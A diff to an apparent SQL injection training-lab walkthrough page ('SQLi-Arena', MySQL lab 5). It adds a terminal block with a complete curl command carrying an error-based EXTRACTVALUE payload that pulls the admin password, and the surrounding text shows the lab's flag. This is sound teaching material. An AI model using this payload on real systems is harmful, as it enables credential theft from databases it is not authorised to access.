@@ -133,6 +133,18 @@
     it into the verification form: <code>FLAG{3xtr4ctv4lu3_x0rth_3rr0r}</code>.
 </p>
 
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">curl. Full Exploit</span>
+    </div>
+    <div class="terminal-body">
+        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab5" \<br> --data-urlencode "username=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'))) -- -" \<br> --data-urlencode "password=anything"
+    </div>
+</div>
+
 <div class="result-success result-box">
     <strong>Key Takeaway:</strong> Even when no query data is displayed on the page,
     MySQL error messages can become a data extraction channel. EXTRACTVALUE() and
